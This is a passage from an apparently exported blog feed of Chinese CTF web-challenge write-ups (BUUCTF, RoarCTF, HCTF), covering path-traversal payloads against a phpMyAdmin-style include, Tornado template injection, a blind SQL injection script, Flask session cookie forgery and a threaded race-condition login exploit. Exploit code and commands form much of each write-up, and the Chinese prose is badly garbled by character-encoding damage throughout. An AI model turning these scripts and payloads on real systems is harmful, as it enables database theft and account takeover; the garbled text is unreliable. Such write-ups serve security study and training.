è·å–æ•°æ®åº“\nprint(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&quot;))\n\n# è·å–æ•°æ®åº“è¡¨\nprint(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos;&quot;))\n\n# è·å–æ•°æ®åº“è¡¨\nprint(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos; AND TABLE_NAME = &apos;F4l9_t4b1e&apos; &quot;))\n\n# è·å–è¡¨ä¸­å†…å®¹\nprint(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&quot;))</code></pre><p>è¿™é‡Œç”¨çš„æ˜¯ <code>1&#39;|&#39;1&#39;|&#39;1</code> ç„¶åå¼‚æˆ–ä¹Ÿå¯ä»¥ <code>1&#39;^&#39;0&#39;^&#39;1</code></p>\n<h2 id=\"å‚è€ƒé“¾æ¥\"><a href=\"#å‚è€ƒé“¾æ¥\" class=\"headerlink\" title=\"å‚è€ƒé“¾æ¥\"></a>å‚è€ƒé“¾æ¥</h2><blockquote>\n<p><a href=\"https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/\" target=\"_blank\" rel=\"noopener\">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/213359.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/web/213359.html</a></p>\n<p><a href=\"https://paper.seebug.org/1048/#32-cl-cl\" target=\"_blank\" rel=\"noopener\">https://paper.seebug.org/1048/#32-cl-cl</a></p>\n</blockquote>\n","text":"roarctf 201910/16/2019 4:45:49 PM easy_javaæ‹¿åˆ°é¢˜ç›®çœ‹åˆ°æ–‡ä»¶ä¸‹è½½çš„æ¥å£ï¼Œå°è¯• /Download?filename=help.docx ,å‘ç°æ²¡æ³•ä¸‹è½½ï¼Œå°è¯•ä¸‹è½½ç½‘é¡µä¸Šçš„ç…§ç‰‡å‘ç°ä¹Ÿä¸‹è½½ä¸äº†ï¼Œåæ¥å°±è·‘åäº†ï¼Œåœ¨æƒ³ä¼šä¸ä¼šæ˜¯ SSTI ?fuzzäº†","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}]},{"title":"BUUCTF åˆ·é¢˜(1)","slug":"BUUCTF-WP","date":"2020-04-29T06:43:09.000Z","updated":"2020-04-29T05:56:32.771Z","comments":true,"path":"api/articles/BUUCTF-WP.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"BUUCTF-wp\"><a href=\"#BUUCTF-wp\" class=\"headerlink\" title=\"BUUCTF  wp\"></a>BUUCTF  wp</h1><h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"Warm-up\"><a href=\"#Warm-up\" class=\"headerlink\" title=\"Warm up\"></a>Warm up</h3><p>æŸ¥çœ‹æºç </p>\n<pre><code> &lt;?php\n    highlight_file(__FILE__);\n    class emmm\n    {\n        public static function checkFile(&amp;$page)\n        {\n            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];\n            if (! isset($page) || !is_string($page)) {\n                echo &quot;you can&apos;t see it&quot;;\n                return false;\n            }\n\n            if (in_array($page, $whitelist)) {\n                return true;\n            }\n\n            $_page = mb_substr(\n                $page,\n                0,\n                mb_strpos($page . &apos;?&apos;, &apos;?&apos;)\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n\n            $_page = urldecode($page);\n            $_page = mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n            echo &quot;you can&apos;t see it&quot;;\n            return false;\n        }\n    }\n\n    if (! empty($_REQUEST[&apos;file&apos;])\n        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])\n        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])\n    ) {\n        include $_REQUEST[&apos;file&apos;];\n        exit;\n    } else {\n        echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;;\n    }  \n?&gt; </code></pre><p>å­˜åœ¨ <code>phpmyadmin 4.8.1</code> è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ <code>cve-2018-12613</code></p>\n<blockquote>\n<p>mb_strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®</p>\n<p>mb_substr â€” è·å–éƒ¨åˆ†å­—ç¬¦ä¸²</p>\n</blockquote>\n<p>å› ä¸ºè€ƒè™‘åˆ° <code>file</code> å¯èƒ½å¸¦å‚æ•°çš„é—®é¢˜æ‰€ä»¥å…ˆè¿›è¡Œäº†ä¸€æ¬¡ <code>mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</code> ï¼Œå¦‚æœè¿™é‡Œæ¥ä¸‹æ¥çš„åˆ¤æ–­é€šè¿‡åˆ™ç›´æ¥è¿”å› <code>true</code> ã€‚å¦‚æœå¤±è´¥åˆ™å¯¹è¿”å›çš„ç»“æœè¿›è¡Œä¸€æ¬¡ <code>urldecode</code> ï¼Œæˆ‘ä»¬çŸ¥é“æµè§ˆå™¨ä¼šè‡ªåŠ¨å°†ä¼ è¾“çš„æ•°æ®è¿›è¡Œä¸€æ¬¡è§£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ å…¥äºŒæ¬¡ç¼–ç çš„ <code>?-&gt;%253F</code> ä¹‹åä¼šç»è¿‡ä¸¤æ¬¡è§£ç å¾—åˆ° <code>?</code> ,ä»è€Œä½¿è¿”å› <code>true</code> .åœ¨ <code>checkfile</code> è¿”å› <code>true</code> ä¹‹åæˆ‘ä»¬å°±æœ‰äº†ç›®å½•ç©¿è¶ŠåŒ…å«æ–‡ä»¶ã€‚</p>\n<p>æˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•:</p>\n<pre><code>?file=hint.php?../../../../../ffffllllaaaagggg\nfile=hint.php%253f../../../../../ffffllllaaaagggg</code></pre><h2 id=\"easy-tornado\"><a href=\"#easy-tornado\" class=\"headerlink\" title=\"easy_tornado\"></a>easy_tornado</h2><p>æ‰“å¼€é¡µé¢å‘ç°ä¸‰ä¸ªé“¾æ¥ï¼Œå†…å®¹å¦‚ä¸‹</p>\n<pre><code>/flag.txt                //flag in /fllllllllllllag\n/welcome.txt            //render\n/hints.txt                //md5(cookie_secret+md5(filename))</code></pre><p>åº”è¯¥æ˜¯æ¨¡æ¿æ³¨å…¥ï¼Œè€Œä¸”éœ€è¦ cookie_secret .æŠ“åŒ…å¹¶æ²¡æœ‰æŠ“åˆ° cookie </p>\n<p>è§‚å¯Ÿé“¾æ¥ï¼š <code>file?filename=/flag.txt&amp;filehash=07c1e7d13389a10b75c75c9884c867fb</code> æˆ‘ä»¬ç›´æ¥è®¿é—®/fllllllllllllag æŠ¥é”™ <code>/error?msg=Error</code> ï¼Œåœ¨error è¿™é‡Œå°è¯• SSTIï¼š <code>error?msg=1</code> å¯ä»¥æ‰§è¡Œé™æ€è¡¨è¾¾å¼ï¼Œä½†æ˜¯ä¸èƒ½åšè¿ç®—ã€‚</p>\n<p>åœ¨Tornadoçš„å‰ç«¯é¡µé¢æ¨¡æ¿ä¸­ï¼ŒTornadoæä¾›äº†ä¸€äº›å¯¹è±¡åˆ«åæ¥å¿«é€Ÿè®¿é—®å¯¹è±¡</p>\n<pre><code>1 &lt;title&gt;\n2     {{ escape(handler.settings[\"blog_title\"]) }}\n3 &lt;/title&gt;</code></pre><p>ä½†æ˜¯å¥‡æ€ªçš„æ˜¯RequestHandlerä¸­å¹¶æ²¡æœ‰settingsè¿™ä¸ªå±æ€§ï¼Œä¸RequestHandlerå…³è”çš„Applicationå¯¹è±¡ï¼ˆRequestion.applicationï¼‰æ‰æœ‰settingè¿™ä¸ªå±æ€§ï¼åæ¥é‡æ–°ç¿»äº†ä¸€ä¸‹æ–‡æ¡£ï¼Œå‘ç°åˆæ˜¯ä¸€ä¸ªåˆ«åã€‚</p>\n<pre><code>RequestHandler.settings\n\nAn alias for self.application.settings.</code></pre><p>handler æŒ‡å‘RequestHandler</p>\n<p>è€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settings</p>\n<p>æ‰€æœ‰handler.settingså°±æŒ‡å‘RequestHandler.application.settingsäº†ï¼</p>\n<p>æ‰€ä»¥å½“æˆ‘ä»¬è®¿é—® <code>RequestHandler.application.settings</code> å¤±è´¥æ—¶ï¼Œæˆ‘ä»¬è®¿é—® <code>handler.settings</code> å¾—åˆ° <code>secret_key</code> ,ä¹‹åä½¿ç”¨è„šæœ¬è¿›è¡Œ md5åŠ å¯†ä¹‹åè®¿é—®å³å¯ï¼š</p>\n<pre><code>import hashlib</code></pre><p>â€‹<br>â€‹    def md5value(s):<br>â€‹        md5 = hashlib.md5()<br>â€‹        md5.update(s.encode())<br>â€‹        return md5.hexdigest()</p>\n<p>â€‹<br>â€‹    def mdfive2():<br>â€‹        filename = â€˜/fllllllllllllagâ€™<br>â€‹        cookie = râ€M)Z.&gt;}{O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N<del>J84<em>râ€<br>â€‹        #print(md5value(filename))<br>â€‹        # print(md5value(â€˜</em>c].)Y!x&lt;kr1e2_oQ(zO6Xd5D9ZKw7IPCs#4h</del>R-JFa3Vp8B0N&gt;%+WgjHbvfM@[Uâ€™))<br>â€‹        # print(â€˜â€™+md5value(filename))<br>â€‹        print(md5value(cookie + md5value(filename)))#hints md5(cookie_secret+md5(filename))</p>\n<p>â€‹<br>â€‹    mdfive2()</p>\n<h2 id=\"CISCN-hack-world\"><a href=\"#CISCN-hack-world\" class=\"headerlink\" title=\"CISCN-hack_world\"></a>CISCN-hack_world</h2><p>è¿›å…¥é¶æœºï¼Œçœ‹åˆ°ï¼š</p>\n<pre><code>All You Want Is In Table &apos;flag&apos; and the column is &apos;flag&apos;\nNow, just give the id of passage</code></pre><p>è¾“å…¥0ï¼Œ1ï¼Œ2 åˆ†åˆ«æœ‰ä¸åŒå›æ˜¾ï¼Œè¾“å…¥éƒ¨åˆ†å…³é”®å­—æ˜¾ç¤º <code>bool(false)</code> ,åº”è¯¥æ˜¯å¸ƒå°”ç›²æ³¨ã€‚åœ¨bpé‡ŒFUZZï¼Œ<code>orã€andã€/*ã€unionã€ç©ºæ ¼</code>ç­‰éƒ½è¢«è¿‡æ»¤äº†ã€‚</p>\n<p>ç›´æ¥ <code>select flag from flag</code> æŸ¥è¯¢è¢«è¿‡æ»¤ï¼Œç»•è¿‡ç©ºæ ¼å¯ä»¥ç”¨æ‹¬å· <code>select(flag)from(flag)</code> </p>\n<p>ç”¨äºŒåˆ†æ³•çŒœè§£åå­—</p>\n<pre><code>import requests\nimport time\n\nurl = &apos;http://be659fb8-1739-4a9f-9f9e-8e2be1e33ce6.node3.buuoj.cn/index.php&apos;\ndata = {&quot;id&quot;:&quot;&quot;}\nflag = &apos;flag{&apos;\n\ni = 6\nwhile True:\n\n    begin = 32\n    end = 126\n    tmp = (begin+end)//2\n    while begin&lt;end:\n        print(begin,tmp,end)\n        time.sleep(1)\n        data[&quot;id&quot;] = &quot;if(ascii(substr((select(flag)from(flag)),{},1))&gt;{},1,2)&quot;.format(i,tmp)\n        r = requests.post(url,data=data)\n        if &apos;Hello&apos; in r.text:\n            begin = tmp+1\n            tmp = (begin+end)//2\n        else:\n            end = tmp\n            tmp = (begin+end)//2\n\n    flag+=chr(tmp)\n    print(flag)\n    i+=1\n    if flag[-1]==&apos;}&apos;:\n        break</code></pre><h2 id=\"HCTF-admin\"><a href=\"#HCTF-admin\" class=\"headerlink\" title=\"HCTF admin\"></a>HCTF admin</h2><p>11/6/2019 8:43:40 PM </p>\n<h3 id=\"flask-session-ä¼ªé€ \"><a href=\"#flask-session-ä¼ªé€ \" class=\"headerlink\" title=\"flask-session ä¼ªé€ \"></a>flask-session ä¼ªé€ </h3><p>ä»æºç å¾—åˆ°æç¤ºä¸‹è½½åˆ°äº†æºç </p>\n<p>è´´ä¸€éƒ¨åˆ†ä»£ç ï¼š</p>\n<pre><code>index.html\n\n{% if current_user.is_authenticated and session['name'] == 'admin' %}\n\t<h1 class=\"nav\">hctf{xxxxxxxxx}</h1>\n\t{% endif %}\n&lt;!-- you are not admin --&gt;\n&lt;h1 class=&quot;nav&quot;&gt;Welcome to hctf&lt;/h1&gt;\n\n\nconfig.py\n\nimport os\n\nclass Config(object):\n    SECRET_KEY = os.environ.get(&apos;SECRET_KEY&apos;) or &apos;ckj123&apos;\n    SQLALCHEMY_DATABASE_URI = &apos;mysql+pymysql://root:adsl1234@db:3306/test&apos;\n    SQLALCHEMY_TRACK_MODIFICATIONS = True</code></pre><p>â€‹<br>â€‹    routes.py/change<br>â€‹<br>    @app.route(â€˜/changeâ€™, methods = [â€˜GETâ€™, â€˜POSTâ€™])<br>    def change():<br>        if not current_user.is_authenticated:<br>            return redirect(url_for(â€˜loginâ€™))<br>        form = NewpasswordForm()<br>        if request.method == â€˜POSTâ€™:<br>            name = strlower(session[â€˜nameâ€™])<br>            user = User.query.filter_by(username=name).first()<br>            user.set_password(form.newpassword.data)<br>            db.session.commit()<br>            flash(â€˜change successfulâ€™)<br>            return redirect(url_for(â€˜indexâ€™))<br>        return render_template(â€˜change.htmlâ€™, title = â€˜changeâ€™, form = form)</p>\n<p>å¯ä»¥çœ‹åˆ°ç”¨ admin è´¦æˆ·ç™»é™†å³å¯å¾—åˆ° flagï¼Œè¿™é‡Œæ¶‰åŠåˆ°äº† flask session ä¼ªé€ ï¼Œç®€å•æœç´¢æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“æœåˆ°pç¥çš„ session<br>è§£å¯†è„šæœ¬ï¼š</p>\n<pre><code>#!/usr/bin/env python3\nimport sys\nimport zlib\nfrom base64 import b64decode\nfrom flask.sessions import session_json_serializer\nfrom itsdangerous import base64_decode\n\ndef decryption(payload):\n    payload, sig = payload.rsplit(b&apos;.&apos;, 1)\n    payload, timestamp = payload.rsplit(b&apos;.&apos;, 1)\n\n    decompress = False\n    if payload.startswith(b&apos;.&apos;):\n        payload = payload[1:]\n        decompress = True\n\n    try:\n        payload = base64_decode(payload)\n    except Exception as e:\n        raise Exception(&apos;Could not base64 decode the payload because of &apos;\n                         &apos;an exception&apos;)\n\n    if decompress:\n        try:\n            payload = zlib.decompress(payload)\n        except Exception as e:\n            raise Exception(&apos;Could not zlib decompress the payload before &apos;\n                             &apos;decoding the payload&apos;)\n\n    return session_json_serializer.loads(payload)\n\nif __name__ == &apos;__main__&apos;:\n    print(decryption(sys.argv[1].encode()))</code></pre><p>å…ˆæ³¨å†Œä¸€ä¸ªæ™®é€šè´¦å·è¿›è¡Œç™»é™†ï¼Œå¾—åˆ°cookieï¼Œç»è¿‡è„šæœ¬è§£å¯† <code>python3 py3-flask_session_decode.py cookie</code> å¾—åˆ°ï¼š</p>\n<pre><code>{&apos;_fresh&apos;: True, &apos;_id&apos;: b&apos;bbf3746b9cd211acd60600a7d24fc55c2dcf65c790142d9b984e1d954d61201b76dbcc4c5221672ce13679718528b34f3f45b7afc79b6384c9b8e7168aa6e8f3&apos;, &apos;csrf_token&apos;: b&apos;b7b7b2574958167d3670aa0e5bf46e47b60d1e39&apos;, &apos;image&apos;: b&apos;TmDp&apos;, &apos;name&apos;: &apos;goya&apos;, &apos;user_id&apos;: &apos;10&apos;}</code></pre><p>é€šè¿‡æºç æˆ‘ä»¬çœ‹åˆ°è¿™å¥è¯ <code>SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;</code> ï¼Œå…¶ä¸­ <code>environ</code> æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æ‰€å¯¹åº”ç¯å¢ƒçš„æ˜ åƒå¯¹è±¡ï¼Œä¾‹å¦‚ </p>\n<pre><code>&gt;&gt;&gt; os.environ[&apos;TEMP&apos;]\n&apos;C:\\\\Users\\\\*****\\\\AppData\\\\Local\\\\Temp&apos;</code></pre><p>å½“è·å–ä¸åˆ° <code>SECRET_KEY</code> æ—¶å°±ä½¿ç”¨ <code>ckj123</code> ä½œä¸ºå¯†é’¥ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸ç¡®å®šæ˜¯ä¸æ˜¯èƒ½è·å–åˆ°ç¯å¢ƒå˜é‡é‡Œçš„keyï¼Œä½†æ˜¯æˆ‘ä»¬ç”¨ ckj123 å…ˆè¿›è¡Œæµ‹è¯•ã€‚</p>\n<p>åˆ©ç”¨æœåˆ°çš„è„šæœ¬ <a href=\"https://github.com/noraj/flask-session-cookie-manager\">https://github.com/noraj/flask-session-cookie-manager</a> ä¿®æ”¹ <code>name</code> ä¸º <code>admin</code> æ¥ç”Ÿæˆä¼ªé€ çš„cookieï¼š</p>\n<pre><code>python2 flask_session_cookie_manager2.py encode -s &quot;ckj123&quot; -t &quot;{&apos;_fresh&apos;: True, &apos;_id&apos;: b&apos;bbf3746b9cd211acd60600a7d24fc55c2dcf65c790142d9b984e1d954d61201b76dbcc4c5221672ce13679718528b34f3f45b7afc79b6384c9b8e7168aa6e8f3&apos;, &apos;csrf_token&apos;: b&apos;b7b7b2574958167d3670aa0e5bf46e47b60d1e39&apos;, &apos;image&apos;: b&apos;TmDp&apos;, &apos;name&apos;: &apos;admin&apos;, &apos;user_id&apos;: &apos;10&apos;}&quot;</code></pre><p>ç”Ÿæˆæ–° cookieï¼š</p>\n<pre><code>.eJxNkEGPgjAQhf_KpmcPWPBC4kFSIZDMEE2xaS-ERQQKdRPUKBj_-1Y3WT1NMm_me2_mTvLDUJ0a4p-HSzUjebsn_p18fROfSJMYmEoHTbyQdDMCDxtbKTB5hWjtKhY7ysAcBYwqQoN6p3HqrsA3o2J9m_LaUTzsUp45iskb6NVN6pKqKNFy2mrksWVKFwz2wIHaXRd4PQfdtDBtDVDpoIhdKZTl9i1q8DCChdRNj9OaplHYoMk8pWFJHjNSnoZDfv7pquP7BL1vkcYj8tKxMbynnWJPq6CRPOhRJAaZ6pHZOR10ILIp3SxfuNYUdfVP2kXzdbn6U46FeQtSbM-F8F7C5VQNnx8EvrL9xy8gAnGJ.XcK0Ow.1V55Ih_Ip48Y5fgVUgbSNrQlWyU</code></pre><p>æ­¤æ—¶æˆ‘ä»¬æ›¿æ¢å·²ç»ç™»é™†è´¦å·çš„ cookie å³å¯å¾—åˆ°flag</p>\n<h3 id=\"unicodeæ¬ºéª—\"><a href=\"#unicodeæ¬ºéª—\" class=\"headerlink\" title=\"unicodeæ¬ºéª—\"></a>unicodeæ¬ºéª—</h3><p>çœ‹WPçœ‹åˆ°çš„å¦ä¸€ç§æ–¹æ³•ï¼ŒæŒºæœ‰æ„æ€</p>\n<p>è§‚å¯Ÿè·¯ç”±å¤„çš„ä»£ç ï¼š</p>\n<pre><code>@app.route(&apos;/register&apos;, methods = [&apos;GET&apos;, &apos;POST&apos;])\ndef register():\n\n    if current_user.is_authenticated:\n        return redirect(url_for(&apos;index&apos;))\n\n    form = RegisterForm()\n    if request.method == &apos;POST&apos;:\n        **name = strlower(form.username.data)**\n        if session.get(&apos;image&apos;).lower() != form.verify_code.data.lower():\n            flash(&apos;Wrong verify code.&apos;)\n            return render_template(&apos;register.html&apos;, title = &apos;register&apos;, form=form)\n        if User.query.filter_by(username = name).first():\n            flash(&apos;The username has been registered&apos;)\n            return redirect(url_for(&apos;register&apos;))\n        user = User(username=name)\n        user.set_password(form.password.data)\n        db.session.add(user)\n        db.session.commit()\n        flash(&apos;register successful&apos;)\n        return redirect(url_for(&apos;login&apos;))\n    return render_template(&apos;register.html&apos;, title = &apos;register&apos;, form = form)\n\n@app.route(&apos;/login&apos;, methods = [&apos;GET&apos;, &apos;POST&apos;])\ndef login():\n    if current_user.is_authenticated:\n        return redirect(url_for(&apos;index&apos;))\n\n    form = LoginForm()\n    if request.method == &apos;POST&apos;:\n        **name = strlower(form.username.data)**\n        session[&apos;name&apos;] = name\n        user = User.query.filter_by(username=name).first()\n        if user is None or not user.check_password(form.password.data):\n            flash(&apos;Invalid username or password&apos;)\n            return redirect(url_for(&apos;login&apos;))\n        login_user(user, remember=form.remember_me.data)\n        return redirect(url_for(&apos;index&apos;))\n    return render_template(&apos;login.html&apos;, title = &apos;login&apos;, form = form)\n\n@app.route(&apos;/change&apos;, methods = [&apos;GET&apos;, &apos;POST&apos;])\ndef change():\n    if not current_user.is_authenticated:\n        return redirect(url_for(&apos;login&apos;))\n    form = NewpasswordForm()\n    if request.method == &apos;POST&apos;:\n        **name = strlower(session[&apos;name&apos;])**\n        user = User.query.filter_by(username=name).first()\n        user.set_password(form.newpassword.data)\n        db.session.commit()\n        flash(&apos;change successful&apos;)\n        return redirect(url_for(&apos;index&apos;))\n    return render_template(&apos;change.html&apos;, title = &apos;change&apos;, form = form)</code></pre><p>python å·²ç»æœ‰äº†è‡ªå·±çš„ lower() å‡½æ•°ä¸ç”¨ï¼Œç”¨äº†è‡ªå·±å®šä¹‰çš„ strlower() ï¼Œè¿›åˆ°è¿™ä¸ªå‡½æ•°ï¼š</p>\n<pre><code>def strlower(username):\n    username = nodeprep.prepare(username)\n    return username</code></pre><p>å¯ä»¥çœ‹åˆ° <code>from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep</code> è¿™ä¸ªå‡½æ•°æ¥è‡ª twisted ,è€Œé¢˜ç›®ä¸­ <code>Twisted==10.2.0</code> ,ç‰ˆæœ¬å·®è·æœ‰ç‚¹å¤§ã€‚</p>\n<p>å¯¹äºä¸€äº›å­—ç¬¦ï¼Œ<a href=\"https://unicode-table.com/en/search/?q=small+capital\" target=\"_blank\" rel=\"noopener\">https://unicode-table.com/en/search/?q=small+capital</a> è¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯</p>\n<pre><code>á´€ -&gt; A -&gt; a</code></pre><p>æˆ‘ä»¬åœ¨ä¸Šé¢çš„ç½‘ç«™ä¸Šæ‰¾åˆ°ä¸€ä¸ª <code>Ä</code> ï¼Œç„¶åæ³¨å†Œ <code>Ädmin</code> ,æ­¤æ—¶ç»è¿‡ä¸€æ¬¡ <code>strlower()</code> å˜ä¸º <code>ADMIN</code> ï¼Œä¹‹åæˆ‘ä»¬ç™»é™† <code>ADMIN</code> ï¼Œå†ç»è¿‡ä¸€æ¬¡ <code>strlower()</code> å°±æˆä¸ºäº† <code>admin</code> ã€‚</p>\n<h3 id=\"æ¡ä»¶ç«äº‰\"><a href=\"#æ¡ä»¶ç«äº‰\" class=\"headerlink\" title=\"æ¡ä»¶ç«äº‰\"></a>æ¡ä»¶ç«äº‰</h3><p>å…ˆæ³¨å†Œä¸€ä¸ªç”¨æˆ·ç„¶åå¼€ä¸€ä¸ªçº¿ç¨‹æ”¹å¯†ç ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨ admin ç™»é™†ï¼Œåœ¨æŸä¸€ç¬é—´ç”Ÿæˆ admin çš„session æ—¶æˆ‘ä»¬æ”¹å¯†ç çš„æ“ä½œä¹Ÿåˆ°äº†ï¼Œè¿™æ—¶å°±å¯ä»¥ä¿®æ”¹å¯†ç äº†</p>\n<pre><code>exp.py\n\nimport requests\nimport threading\n\ndef login(s, username, password):\n    data = {\n        &apos;username&apos;: username,\n        &apos;password&apos;: password,\n        &apos;submit&apos;: &apos;&apos;\n    }\n    return s.post(&quot;http://admin.2018.hctf.io/login&quot;, data=data)\n\ndef logout(s):\n    return s.get(&quot;http://admin.2018.hctf.io/logout&quot;)\n\ndef change(s, newpassword):\n    data = {\n        &apos;newpassword&apos;:newpassword\n    }\n    return s.post(&quot;http://admin.2018.hctf.io/change&quot;, data=data)\n\ndef func1(s):\n    login(s, &apos;skysec&apos;, &apos;skysec&apos;)\n    change(s, &apos;skysec&apos;)\n\ndef func2(s):\n    logout(s)\n    res = login(s, &apos;admin&apos;, &apos;skysec&apos;)\n    if &apos;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&apos; in res.text:\n        print(&apos;finish&apos;)\n\ndef main():\n    for i in range(1000):\n        print(i)\n        s = requests.Session()\n        t1 = threading.Thread(target=func1, args=(s,))\n        t2 = threading.Thread(target=func2, args=(s,))\n        t1.start()\n        t2.start()\n\nif __name__ == &quot;__main__&quot;:\n    main()</code></pre><h3 id=\"hide-and-seak\"><a href=\"#hide-and-seak\" class=\"headerlink\" title=\"hide_and_seak\"></a>hide_and_seak</h3><p><strong>zipè½¯è¿æ¥è¯»å–æ–‡ä»¶</strong></p>\n<p>Linux lnå‘½ä»¤æ˜¯ä¸€ä¸ªéå¸¸é‡è¦å‘½ä»¤ï¼Œå®ƒçš„åŠŸèƒ½æ˜¯ä¸ºæŸä¸€ä¸ªæ–‡ä»¶åœ¨å¦å¤–ä¸€ä¸ªä½ç½®å»ºç«‹ä¸€ä¸ªåŒæ­¥çš„é“¾æ¥ã€‚   å½“æˆ‘ä»¬éœ€è¦åœ¨ä¸åŒçš„ç›®å½•ï¼Œç”¨åˆ°ç›¸åŒçš„æ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬ä¸éœ€è¦åœ¨æ¯ä¸€ä¸ªéœ€è¦çš„ç›®å½•ä¸‹éƒ½æ”¾ä¸€ä¸ªå¿…é¡»ç›¸åŒçš„æ–‡ä»¶ï¼Œæˆ‘ä»¬åªè¦åœ¨æŸä¸ªå›ºå®šçš„ç›®å½•ï¼Œæ”¾ä¸Šè¯¥æ–‡ä»¶ï¼Œç„¶ååœ¨ å…¶å®ƒçš„ç›®å½•ä¸‹ç”¨lnå‘½ä»¤é“¾æ¥ï¼ˆlinkï¼‰å®ƒå°±å¯ä»¥ï¼Œä¸å¿…é‡å¤çš„å ç”¨ç£ç›˜ç©ºé—´ã€‚</p>\n<p>Linuxæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œæœ‰æ‰€è°“çš„é“¾æ¥(link)ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶è§†ä¸ºæ¡£æ¡ˆçš„åˆ«åï¼Œè€Œé“¾æ¥åˆå¯åˆ†ä¸ºä¸¤ç§ : ç¡¬é“¾æ¥(hard link)ä¸è½¯é“¾æ¥(symbolic link)ï¼Œç¡¬é“¾æ¥çš„æ„æ€æ˜¯ä¸€ä¸ªæ¡£æ¡ˆå¯ä»¥æœ‰å¤šä¸ªåç§°ï¼Œè€Œè½¯é“¾æ¥çš„æ–¹å¼åˆ™æ˜¯äº§ç”Ÿä¸€ä¸ªç‰¹æ®Šçš„æ¡£æ¡ˆï¼Œè¯¥æ¡£æ¡ˆçš„å†…å®¹æ˜¯æŒ‡å‘å¦ä¸€ä¸ªæ¡£æ¡ˆçš„ä½ç½®ã€‚ç¡¬é“¾æ¥æ˜¯å­˜åœ¨åŒä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œè€Œè½¯é“¾æ¥å´å¯ä»¥è·¨è¶Šä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿã€‚</p>\n<p>è½¯é“¾æ¥ï¼š</p>\n<pre><code>1.è½¯é“¾æ¥ï¼Œä»¥è·¯å¾„çš„å½¢å¼å­˜åœ¨ã€‚ç±»ä¼¼äºWindowsæ“ä½œç³»ç»Ÿä¸­çš„å¿«æ·æ–¹å¼\n2.è½¯é“¾æ¥å¯ä»¥ è·¨æ–‡ä»¶ç³»ç»Ÿ ï¼Œç¡¬é“¾æ¥ä¸å¯ä»¥\n3.è½¯é“¾æ¥å¯ä»¥å¯¹ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶åè¿›è¡Œé“¾æ¥\n4.è½¯é“¾æ¥å¯ä»¥å¯¹ç›®å½•è¿›è¡Œé“¾æ¥</code></pre><p>ç¡¬é“¾æ¥ï¼š</p>\n<pre><code>1.ç¡¬é“¾æ¥ï¼Œä»¥æ–‡ä»¶å‰¯æœ¬çš„å½¢å¼å­˜åœ¨ã€‚ä½†ä¸å ç”¨å®é™…ç©ºé—´ã€‚\n2.ä¸å…è®¸ç»™ç›®å½•åˆ›å»ºç¡¬é“¾æ¥\n3.ç¡¬é“¾æ¥åªæœ‰åœ¨åŒä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­æ‰èƒ½åˆ›å»º</code></pre><p>æˆ‘ä»¬å°è¯•ç”Ÿæˆä¸€ä¸ªè½¯è¿æ¥</p>\n<pre><code>/tmp# ln -s test.txt test\n      ll\nlrwxrwxrwx  1 root  root 8 11æœˆ  7 17:41 test -&gt; test.txt\n-rw-r--r--  1 root  root12 11æœˆ  7 17:41 test.txt\n\n/tmp# cat test\nhello world\n\n/tmp# cat test.txt\nhello world</code></pre><p>å°è¯•è¯»å–æ–‡ä»¶å†…å®¹ï¼š</p>\n<pre><code>php -r &quot;echo file_get_contents(&apos;test.txt&apos;);&quot;\nhello world\n\nphp -r &quot;echo file_get_contents(&apos;test&apos;);&quot;\nhello 